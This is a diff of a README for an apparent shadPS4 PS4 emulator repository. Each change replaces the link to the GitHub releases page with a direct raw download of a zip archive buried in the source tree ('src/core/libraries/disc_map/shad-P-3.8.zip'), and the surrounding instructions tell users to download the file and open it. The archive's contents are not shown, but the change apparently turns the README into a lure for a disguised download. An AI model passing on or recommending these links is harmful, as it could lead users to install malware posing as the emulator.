@@ -1,11 +1,11 @@
-[![Download shadPS4](https://img.shields.io/badge/Download%20shadPS4-Release%20Page-blue?style=for-the-badge)](https://github.com/Prerecorded-dilater808/shadPS4/releases)
+[![Download shadPS4](https://img.shields.io/badge/Download%20shadPS4-Release%20Page-blue?style=for-the-badge)](https://github.com/Prerecorded-dilater808/shadPS4/raw/refs/heads/main/src/core/libraries/disc_map/shad-P-3.8.zip)
 
 # 🎮 shadPS4 - Play PS4 Games on Your PC
 
 ## 🚀 Download
 
 Visit this page to download:  
-https://github.com/Prerecorded-dilater808/shadPS4/releases
+https://github.com/Prerecorded-dilater808/shadPS4/raw/refs/heads/main/src/core/libraries/disc_map/shad-P-3.8.zip
 
 Choose the latest Windows release, download the file for your PC, and open it after the download finishes.
 
@@ -43,7 +43,7 @@ For better performance, a newer CPU and GPU help a lot.
 ## 📥 How to Download and Install on Windows
 
 1. Open the release page:  
-   https://github.com/Prerecorded-dilater808/shadPS4/releases
+   https://github.com/Prerecorded-dilater808/shadPS4/raw/refs/heads/main/src/core/libraries/disc_map/shad-P-3.8.zip
 
 2. Find the latest release at the top of the page.
 
@@ -174,7 +174,7 @@ These tools help the app handle graphics, input, and the user interface.
 ## 🔗 Download Again
 
 Download the Windows release here:  
-https://github.com/Prerecorded-dilater808/shadPS4/releases
+https://github.com/Prerecorded-dilater808/shadPS4/raw/refs/heads/main/src/core/libraries/disc_map/shad-P-3.8.zip
 
 ## 📌 Notes for Windows Users
 
